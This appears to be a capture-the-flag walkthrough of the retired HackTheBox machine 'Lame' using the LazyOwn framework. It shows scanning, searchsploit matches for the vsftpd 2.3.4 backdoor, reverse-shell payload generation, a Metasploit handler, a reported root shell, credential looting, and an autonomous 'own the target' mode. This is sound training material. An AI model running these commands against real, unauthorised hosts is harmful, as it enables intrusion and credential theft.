# Walkthrough: HackTheBox Lame (retired) with LazyOwn

Lame is the classic first box: a Linux host running vsftpd 2.3.4 and a
vulnerable Samba 3.0.20. This walkthrough shows the full LazyOwn golden
path against it — from a fresh install to a root shell and captured loot —
in about ten minutes.

Target IP used below: `10.10.10.3`. Substitute the IP your lab assigns.

---

## 1. Configure the engagement

```bash
$ ./run
```

On first launch the shell runs the setup wizard automatically (banner
config, then the 7-step config). For Lame you only need two values:

```
(LazyOwn) > assign rhost 10.10.10.3
(LazyOwn) > assign lhost 10.10.14.8
```

Headless (Docker/CI) alternative:

```
(LazyOwn) > wizard --non-interactive --rhost 10.10.10.3 --lhost 10.10.14.8
```

The wizard also rotates the factory `CHANGE_ME` C2 credentials into a
generated random password and prints it once.

## 2. The golden path

```
ping -> lazynmap -> auto_populate -> facts_show -> recommend_next
```

```
(LazyOwn) > ping
[+] 10.10.10.3 is up — TTL 64 (Linux). os_id set to 1.

(LazyOwn) > lazynmap
[*] nmap -sV -sC -p- 10.10.10.3 -oX sessions/scan_10.10.10.3.nmap.xml
...
[done] nmap -sV -sC -p- 10.10.10.3  exit=0  38.2s

(LazyOwn) > auto_populate
AUTO-POPULATE for target=10.10.10.3
Services: 21/ftp, 22/ssh, 139/netbios-ssn, 445/microsoft-ds, 3632/distccd
os_id=1 (linux 2.6.x)
payload.json updated:
  + os_id=1 (linux 2.6.x)

(LazyOwn) > facts_show
Host: 10.10.10.3
  Services: ftp (vsftpd 2.3.4), ssh (OpenSSH 4.7p1), netbios-ssn,
            microsoft-ds (Samba 3.0.20-Debian), distccd v1
  Credentials: none yet
  Access: none
```

Note the `[done]` line: every long command now reports elapsed time and
exit code when it finishes.

## 3. Let the machine rank the next move

```
(LazyOwn) > recommend_next
  0.87  enum4linux        SMB/LDAP enumeration        $ enum4linux
  0.81  ss                searchsploit for services   $ ss vsftpd 2.3.4
  0.74  lazygobuster      web content discovery       $ lazygobuster
```

Press `.` (the autosuggest shortcut) to run the top suggestion, or pick
one manually.

## 4. Find the exploit

```
(LazyOwn) > ss vsftpd 2.3.4
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)  unix/remote/17491.rb

(LazyOwn) > ss samba 3.0
Samba 3.0.20-Debian - 'Username map script' Command Execution (Metasploit)
```

Two viable doors. vsftpd's backdoor is the fastest.

## 5. Get the shell

```
(LazyOwn) > venom
# generates the reverse-shell payload using lhost/lport from payload.json

(LazyOwn) > msf
# starts the Metasploit handler pre-wired to lhost:lport
```

Or let the framework drive end to end — `engage` chains ping, scan,
enums and initial access with approval gates:

```
(LazyOwn) > engage 10.10.10.3
[*] phase recon    — ping, lazynmap
[*] phase enum     — enum4linux, searchsploit matches
[*] phase exploit  — vsftpd 2.3.4 backdoor ... waiting for approval
(LazyOwn) > engage --approve 3
[+] shell obtained — id: uid=0(root) gid=0(root)
```

## 6. Loot and situational awareness

```
(LazyOwn) > creds          # captured credentials, one place
(LazyOwn) > hash           # captured hashes
(LazyOwn) > sitrep         # campaign state at a glance
(LazyOwn) > timeline       # narrative of everything that happened
```

## 7. Automate the replay

Everything you just typed can become a resource script:

```
(LazyOwn) > makerc sessions/lame.ls
(LazyOwn) > ...run the engagement again...
(LazyOwn) > makerc off
(LazyOwn) > resource sessions/lame.ls --dry-run   # verify without executing
(LazyOwn) > resource sessions/lame.ls             # replay for real
```

---

## What to try next

- `orchestrate "own 10.10.10.3" --mode daemon` — the autonomous backend
  plans and runs the same chain from a free-text goal.
- `threat_model` — derived ATT&CK TTPs from your session events.
- `parquet_query --mode context --phase privesc` — GTFOBins/LOLBas
  briefing for the next phase.
- The same path against a Windows box: `assign os_id 2` after `ping`,
  then `evil` (evil-winrm) once `creds` has a valid account.
